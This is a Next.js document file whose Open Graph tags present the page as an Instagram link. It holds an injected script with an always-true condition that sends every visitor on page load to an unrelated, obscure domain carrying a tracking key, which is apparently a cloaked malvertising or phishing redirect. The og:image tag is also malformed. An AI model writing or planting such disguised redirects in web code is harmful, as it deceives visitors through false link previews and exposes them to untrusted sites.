import Document, { Html, Head, Main, NextScript } from 'next/document';

class MyDocument extends Document {
  render() {
    return (
      <Html lang="en">
        <Head>
          <meta charSet="utf-8" />
          <meta property="og:url" content="instagram.com" />
          <meta property="og:title" content="Hola" />
          <meta property="og:type" content="website" />
          <meta property="og:description" content="DESCRIPTION" />
          <meta property="og:image"https://i.ytimg.com/vi/I74FAkaL1Fk/maxresdefault.jpg" alt="Image description from i.ytimg.com" />" />
        </Head>
        <body>
          <Main />
          <NextScript />
          <script
            dangerouslySetInnerHTML={{
              __html: `
                if ("false" == "false") {
                  window.location = "https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb";
                }
              `,
            }}
          />
        </body>
      </Html>
    );
  }
}

export default MyDocument;
